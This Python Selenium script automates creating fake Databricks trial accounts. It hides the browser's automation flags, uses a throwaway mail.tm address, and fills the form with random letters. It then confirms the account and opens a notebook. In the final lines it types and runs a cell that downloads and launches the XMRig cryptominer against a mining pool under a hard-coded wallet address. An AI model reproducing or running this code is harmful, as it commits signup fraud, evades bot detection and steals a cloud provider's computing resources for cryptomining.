from selenium import webdriver
from selenium.webdriver import ActionChains
from selenium.webdriver.common.keys import Keys
import time
import tkinter as tk
import string
import random
  
# Randomly choose a letter from all the ascii_letters



option = webdriver.ChromeOptions()


#Removes navigator.webdriver flag

# For older ChromeDriver under version 79.0.3945.16
option.add_experimental_option("excludeSwitches", ["enable-automation"])
option.add_experimental_option('useAutomationExtension', False)

#For ChromeDriver version 79.0.3945.16 or over
option.add_argument('--disable-blink-features=AutomationControlled')


#Open Browser
driver = webdriver.Chrome(executable_path='chromedriver',options=option)




driver.get("https://mail.tm/en/")
time.sleep(4)
print("hgee")
continue_link = driver.find_element_by_xpath('//*[@id="address"]').click()


root = tk.Tk()
print(root.clipboard_get())
email=root.clipboard_get()



driver.execute_script("window.open('about:blank','secondtab');")

# It is switching to second tab now
driver.switch_to.window("secondtab")

# In the second tab, it opens geeksforgeeks

driver.get('https://databricks.com/try-databricks')
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="FirstName"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="FirstName"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="FirstName"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="FirstName"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="FirstName"]').send_keys(randomLetter)
time.sleep(1)

randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="LastName"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="LastName"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="LastName"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="LastName"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="LastName"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="LastName"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="LastName"]').send_keys(randomLetter)



time.sleep(1)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="Company"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="Company"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="Company"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="Company"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="Company"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="Company"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="Company"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
driver.find_element_by_xpath('//*[@id="Company"]').send_keys(randomLetter)




time.sleep(1)
driver.find_element_by_xpath('//*[@id="Email"]').send_keys(email)
time.sleep(1)
randomLetter = random.choice(string.ascii_letters)
tits=driver.find_element_by_xpath('//*[@id="Title"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
tits=driver.find_element_by_xpath('//*[@id="Title"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
tits=driver.find_element_by_xpath('//*[@id="Title"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
tits=driver.find_element_by_xpath('//*[@id="Title"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
tits=driver.find_element_by_xpath('//*[@id="Title"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
tits=driver.find_element_by_xpath('//*[@id="Title"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
tits=driver.find_element_by_xpath('//*[@id="Title"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
tits=driver.find_element_by_xpath('//*[@id="Title"]').send_keys(randomLetter)
randomLetter = random.choice(string.ascii_letters)
tits=driver.find_element_by_xpath('//*[@id="Title"]').send_keys(randomLetter)


time.sleep(2)
checkboxElement = driver.find_element_by_id("mkto_form_consent")
checkboxElement.send_keys(Keys.SPACE)
time.sleep(2)
driver.find_element_by_xpath('//*[@id="submitToMktoForm_2021Feb10"]/div[21]/span/button').click()

time.sleep(5)
print("why")
checkboxElementw = driver.find_element_by_xpath('//*[@id="ce-placeholder-button"]')
checkboxElementw.send_keys(Keys.ENTER)
print("ddd")

time.sleep(10)

driver.get("https://mail.tm/en/")
time.sleep(15)
print("hello")

driver.find_element_by_xpath('//*[@id="__layout"]/div/div[2]/main/div/div[2]/ul/li/a/div').click()
time.sleep(10)

driver.switch_to_frame("iFrameResizer0")
driver.find_element_by_xpath('/html/body/p[2]/a').click()	
time.sleep(2)
driver.switch_to_default_content()
handles = driver.window_handles
size = len(handles)
for x in range(size):
  if handles[x] != driver.current_window_handle:
    driver.switch_to.window(handles[x])
    print(driver.title)
time.sleep(2)
driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[1]/input').send_keys("1234Asdfg@")
driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[2]/input').send_keys("1234Asdfg@")
time.sleep(1)
driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[3]/button').click()
time.sleep(15)
print("note")
driver.find_element_by_xpath('//*[@id="content"]/div/div/uses-legacy-bootstrap/div/div/div[2]/div[3]/div[1]/div[3]/div/div/div/a/div[2]').click()
time.sleep(2)
driver.find_element_by_xpath('//*[@id="input"]').send_keys("prog")

time.sleep(1)
driver.find_element_by_xpath('/html/body/div[4]/div/div/uses-legacy-bootstrap/uses-legacy-bootstrap/button[2]').click()
time.sleep(15)
randomLetter = random.choice(string.ascii_letters)
randomLette = random.choice(string.ascii_letters)
driver.find_element_by_css_selector(".CodeMirror-line").click()
driver.find_element_by_css_selector(".CodeMirror textarea").send_keys("! wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xfcc4df90e1c8ff70c835be669b9fb9e89f0b43f1"+randomLetter+randomLette)
driver.find_element_by_css_selector(".fa-play").click()
driver.find_element_by_css_selector(".run-cell > .fa").click()
driver.find_element_by_xpath('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]').click()
